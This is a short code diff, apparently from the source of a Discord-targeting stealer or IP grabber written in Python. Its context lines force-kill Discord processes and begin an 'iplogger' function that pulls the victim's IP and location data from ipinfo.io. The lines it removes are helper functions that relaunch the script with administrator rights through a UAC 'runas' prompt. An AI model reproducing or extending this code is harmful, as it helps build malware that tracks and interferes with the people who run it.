@@ -31,21 +31,6 @@ os.system("TASKKILL /F /IM Discord.exe")
 os.system("TASKKILL /F /IM DiscordPTB.exe")
 os.system("cls") 
 
-def is_admin():
-    try:
-        return os.geteuid() == 0 
-    except AttributeError:
-        return ctypes.windll.shell32.IsUserAnAdmin() != 0 
-    
-def run_as_admin():
-    script = sys.argv[0]
-    params = " ".join(sys.argv[1:])
-    
-    if sys.platform == "win32":
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
-    else:
-        sys.exit(1)
-
 def iplogger():
 
     ipinfo = requests.get("https://ipinfo.io/json").json()
